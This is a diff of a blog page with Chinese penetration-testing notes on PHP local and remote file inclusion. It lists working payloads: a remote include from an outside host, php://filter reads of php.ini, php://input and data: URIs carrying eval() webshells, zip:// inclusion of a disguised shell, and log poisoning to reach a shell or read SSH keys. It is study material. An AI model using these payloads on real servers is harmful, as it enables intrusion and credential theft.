@@ -19,7 +19,7 @@ if (!doNotTrack) {
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>
       
-  文件包含漏洞 &ndash; Arefu&#39;s Zone
+  文件包含漏洞笔记 &ndash; Arefu&#39;s Zone
 
     </title>
     
@@ -39,7 +39,7 @@ if (!doNotTrack) {
     <meta name="twitter:card" content="summary">
     <meta name="twitter:site" content="@">
     <meta name="twitter:creator" content="@">
-    <meta name="twitter:title" content="文件包含漏洞 | Arefu&#39;s Zone">
+    <meta name="twitter:title" content="文件包含漏洞笔记 | Arefu&#39;s Zone">
     <meta name="twitter:description" content="文件包含漏洞|blog under go1f.cc">
     <meta name="twitter:image" content="https://blog.go1f.cc/twitter-card.png">
     
@@ -99,7 +99,7 @@ if (!doNotTrack) {
 
 <div class="Subhead">
   <div class="Subhead-heading">
-    <div class="h1 mt-3 mb-1">文件包含漏洞</div>
+    <div class="h1 mt-3 mb-1">文件包含漏洞笔记</div>
   </div>
   <div class="Subhead-description">
     
@@ -119,9 +119,9 @@ if (!doNotTrack) {
 
     
     <div class="float-md-right">
-      <span title="Lastmod: 2020-01-31. Published at: 2020-01-19.">
+      <span title="Lastmod: 2020-01-20. Published at: 2020-01-19.">
         
-          Lastmod: 2020-01-31
+          Lastmod: 2020-01-20
         
       </span>
     </div>
@@ -137,12 +137,13 @@ if (!doNotTrack) {
 <li>用户能够控制文件内容</li>
 <li>include()等函数通过动态变量的方式引入需要包含的文件</li>
 </ul>
+<p>​</p>
 <h2 id="特征函数">特征函数</h2>
 <ul>
 <li>
 <p>include（错误继续执行）、 require（错误后终止）</p>
 <div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">include($_GET[&#39;file&#39;]);
-</code></pre></div><pre><code>http://127.0.0.1/upload/include.php?file=http://go1f.cc/p.txt&amp;=phpinfo();
+</code></pre></div><pre><code>http://127.0.0.1/upload/include.php?file=http://go1f.cc/p.txt&amp;a=phpinfo();
 </code></pre></li>
 <li>
 <p>require_once 、include_once</p>
@@ -151,7 +152,8 @@ if (!doNotTrack) {
 <p>highlight_file()、show_source()、readfile()、file_get_contents()、fopen()、file()</p>
 </li>
 </ul>
-<h2 id="phpini">php.ini</h2>
+<p>​</p>
+<h2 id="关键phpini参数分析">关键php.ini参数分析</h2>
 <p><strong>allow_url_include</strong>    默认关闭 since php5.2</p>
 <blockquote>
 <p>此选项允许有以下功能include，include_once，require，require_once使用URL的fopen封装。Whether to allow <strong>include/require</strong> to open URLs (like http:// or ftp://) as files.</p>
@@ -162,19 +164,24 @@ if (!doNotTrack) {
 <p>Whether to allow the treatment of URLs (like http:// or ftp://) as files.</p>
 <p>限制 fopen， file_get_contents使用</p>
 </blockquote>
+<p>​</p>
 <blockquote>
 <p>fopen是直接读取这个文件，当做一个输入流，不会在本地做解析。</p>
 <p>include会包含进入代码内，再解析执行一次。</p>
 </blockquote>
+<p>​</p>
 <p><strong>不能通过.htaccess修改以上两个php_flag型的配置</strong></p>
 <p><a href="https://www.php.net/manual/en/configuration.changes.php#configuration.changes">How to change configuration settings</a></p>
 <blockquote>
 <p>&lsquo;allow_url_include&rsquo; is a &lsquo;PHP_INI_SYSTEM&rsquo; directive and hence cannot be set with the mod_php5 &lsquo;php_flag&rsquo;.</p>
 </blockquote>
+<p>​</p>
 <p><strong>绕过方法</strong></p>
 <p><a href="https://paper.seebug.org/923/">PHP和SMB共享文件访问，绕过 URL 包含限制 </a></p>
+<p>​</p>
 <h2 id="rfi-远程文件包含">RFI 远程文件包含</h2>
 <p>http://协议</p>
+<p>​</p>
 <h2 id="lfi--本地文件包含">LFI  本地文件包含</h2>
 <p>可以写多几次，返回上一层目录<code>../../../../../../</code></p>
 <h3 id="日志文件污染">日志文件污染</h3>
@@ -186,36 +193,38 @@ if (!doNotTrack) {
 <p><strong>污染</strong></p>
 <ul>
 <li>访问请求，控制UA或Referer</li>
-<li>nc发送到80端口</li>
+<li>nc到80端口</li>
 <li>直接污染一句话getshell</li>
 <li>迂回地污染恶意代码，譬如有关读取系统敏感文件（/root/.ssh/）</li>
 </ul>
 <p>大型网站日志，踩点，观察备份时间</p>
+<p>​</p>
 <p><strong>Apache启用日志</strong>     apache2.conf</p>
 <pre><code class="language-conf" data-lang="conf">CustomLog &quot;logs/access.log&quot; combined
 ; logfile with access, agent, and referer information
-</code></pre><h3 id="包含文件上传的临时文件httpsdlpacketstormsecuritynetpapersgenerallfi_with_phpinfo_assitancepdf"><a href="https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf">包含文件上传的临时文件</a></h3>
+</code></pre><p>​</p>
+<h3 id="包含文件上传的临时文件httpsdlpacketstormsecuritynetpapersgenerallfi_with_phpinfo_assitancepdf"><a href="https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf">包含文件上传的临时文件</a></h3>
 <p>​</p>
 <h3 id="包含session文件httpswwwcnblogscomoran9ep8082962html"><a href="https://www.cnblogs.com/Oran9e/p/8082962.html">包含session文件</a></h3>
 <p>常见的php-session存放位置：</p>
 <ol start="2">
-<li>/tmp[/sessions]/sess_PHPSESSID</li>
-<li>/var/lib/php5[/sessions]/sess_PHPSESSID</li>
-<li>/var/lib/php[/sessions]/sess_PHPSESSID</li>
-<li>C:/windows/temp[/sessions]/sess_PHPSESSID</li>
+<li>/tmp/[sessions/]sess_PHPSESSID</li>
+<li>/var/lib/php5/[sessions/]sess_PHPSESSID</li>
+<li>/var/lib/php/[sessions/]sess_PHPSESSID</li>
+<li>C:/windows/temp/[sessions/]sess_PHPSESSID</li>
 </ol>
 <p>读取session以登录任意账号</p>
 <p>​</p>
 <h3 id="包含procselfenviron文件httpsblog51ctocompnig0s1992400182"><a href="https://blog.51cto.com/pnig0s1992/400182">包含/proc/self/environ文件</a></h3>
 <p>/proc/self/environ  #当前正在运行的进程的环境变量列表</p>
-<p>系统文件连接符：/proc/self/fd/&hellip;</p>
+<p>/proc/self/fd/&hellip;    #文件连接符</p>
 <p>​</p>
 <h2 id="伪协议">伪协议</h2>
 <p><a href="https://www.php.net/manual/zh/wrappers.php">php支持的协议和封装协议</a></p>
 <h3 id="file协议">file:///协议</h3>
+<p>只能使用<strong>绝对路径</strong></p>
 <pre><code>file:///&lt;绝对路径&gt;
-</code></pre><p>只能使用<strong>绝对路径</strong></p>
-<!-- raw HTML omitted -->
+</code></pre><p>​</p>
 <h3 id="phpfilter">php://filter</h3>
 <p>读取敏感文件、base64转换读取代码、联动图片马等等。</p>
 <h4 id="--对本地文件进行读写">- 对本地文件进行读写</h4>
@@ -225,20 +234,15 @@ if (!doNotTrack) {
 
 #base64编码 convert.base64-encode
 include.php?file=php://filter/read=convert.base64-encode/resource=/etc/php5/apache2/php.ini
-</code></pre><p><strong>更多字符操作函数</strong></p>
-<blockquote>
-<p>read=string.toupper、tolower、rot13、strip_tags</p>
-</blockquote>
-<p><strong>拓展</strong></p>
-<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></p>
+</code></pre><p>更多字符操作函数 <code>read=string.toupper、tolower、rot13、strip_tags</code></p>
+<p>拓展： <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></p>
+<p>​</p>
 <h4 id="--远程文件读取">- 远程文件读取</h4>
 <p>需要allow_url_include on 和 allow_url_fopen on</p>
 <pre><code>include.php?file=php://filter/resource=http://go1f.cc:8000/info.txt
-</code></pre><h3 id="phpinput">php://input</h3>
-<p><strong>条件</strong></p>
-<blockquote>
-<p>allow_url_include on</p>
-</blockquote>
+</code></pre><p>​</p>
+<h3 id="phpinput">php://input</h3>
+<p><strong>条件</strong> <code>allow_url_include on</code></p>
 <p><strong>Payload</strong></p>
 <p>post内容填写一句话，不写键值对形式</p>
 <pre><code>POST /include.php?file=php://input HTTP/1.1
@@ -252,41 +256,40 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Fi
 <pre><code>配置栏填写：
 &lt;O&gt;&lt;?php @eval($_POST[a]);?&gt;&lt;/O&gt;
 </code></pre><p>​</p>
+<p>​</p>
 <p>渗透境界：</p>
 <blockquote>
 <p><strong>无文件 input、data</strong></p>
 <p>无进程 进程注入</p>
 <p>无端口 icmp</p>
 </blockquote>
+<p>​</p>
 <h3 id="data协议">data:协议</h3>
+<p><strong>条件</strong>     <code>allow_url_fopen on</code>  &amp;&amp;  <code>allow_url_include on</code></p>
 <p><strong>格式</strong></p>
 <pre><code>data:[&lt;mime type&gt;][;charset=][;base64],&lt;encoded data&gt;
-</code></pre><p><strong>使用条件</strong></p>
-<blockquote>
-<p>allow_url_fopen on</p>
-<p>allow_url_include on</p>
-</blockquote>
-<p><strong>Payload</strong></p>
+</code></pre><p><strong>Payload</strong></p>
 <pre><code>include.php?file=data:text/plain,&lt;?php eval($_POST[a]);?&gt;
 #或者base64编码
 include.php?file=data:text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbYV0pOyAgPz4=
-</code></pre><h3 id="phar协议">phar://协议</h3>
+</code></pre><p>​</p>
+<h3 id="phar协议">phar://协议</h3>
 <p>读取压缩包内的文件。</p>
 <p>借助对压缩包文件的允许上传，也可以将tar/zip后缀改名为jpg等绕过后缀检测（无碍phar协议使用）。</p>
-<p><strong>条件</strong></p>
-<p>PHP&gt;=<strong>5.3.0</strong></p>
+<p><strong>条件</strong> PHP&gt;=<strong>5.3.0</strong></p>
 <p>支持<strong>tar/zip</strong>，相对路径/绝对路径</p>
 <p><strong>Payload</strong></p>
-<pre><code>test.php?filename=phar://&lt;zipfile.zip&gt;[/&lt;dir&gt;]/&lt;filename&gt;
-</code></pre><h3 id="zip协议">zip://协议</h3>
-<p><strong>条件</strong></p>
-<p>相对路径、绝对路径</p>
+<pre><code>test.php?filename=phar://&lt;zipfile.zip&gt;/[&lt;dir&gt;/]&lt;filename&gt;
+</code></pre><p>​</p>
+<h3 id="zip协议">zip://协议</h3>
+<p><strong>条件</strong>  相对路径、绝对路径</p>
 <p><strong>格式</strong></p>
 <pre><code>zip://绝对路径#[&lt;dirname&gt;/]&lt;filename.txt&gt;
-</code></pre><p><strong>Payload</strong></p>
-<p>压缩包不要求zip后缀，可以修改为jpg等后缀</p>
+</code></pre><p>压缩包不要求zip后缀，可以修改为jpg等后缀</p>
+<p><strong>Payload</strong></p>
 <pre><code>include.php?file=zip://C:/MyProgram/phpstudy_pro/WWW/shell.jpg%23a.php
-</code></pre><p>注意：#在url为截断结束符，发送url编码%23代替</p>
+</code></pre><p>注意：<code>#</code>在url为截断结束符，发送url编码<code>%23</code>代替</p>
+<p>​</p>
 <h3 id="类似协议">类似协议</h3>
 <p>compress.bzip2://</p>
 <p>compress.zlib://</p>
@@ -306,11 +309,11 @@ include.php?file=data:text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbYV0pOyAgPz4=
           
   
     <div id="toc" class="Box Box--blue mb-3">
-      <b>文件包含漏洞</b><nav id="TableOfContents">
+      <b>文件包含漏洞笔记</b><nav id="TableOfContents">
   <ul>
     <li><a href="#两个条件">两个条件</a></li>
     <li><a href="#特征函数">特征函数</a></li>
-    <li><a href="#phpini">php.ini</a></li>
+    <li><a href="#关键phpini参数分析">关键php.ini参数分析</a></li>
     <li><a href="#rfi-远程文件包含">RFI 远程文件包含</a></li>
     <li><a href="#lfi--本地文件包含">LFI  本地文件包含</a>
       <ul>
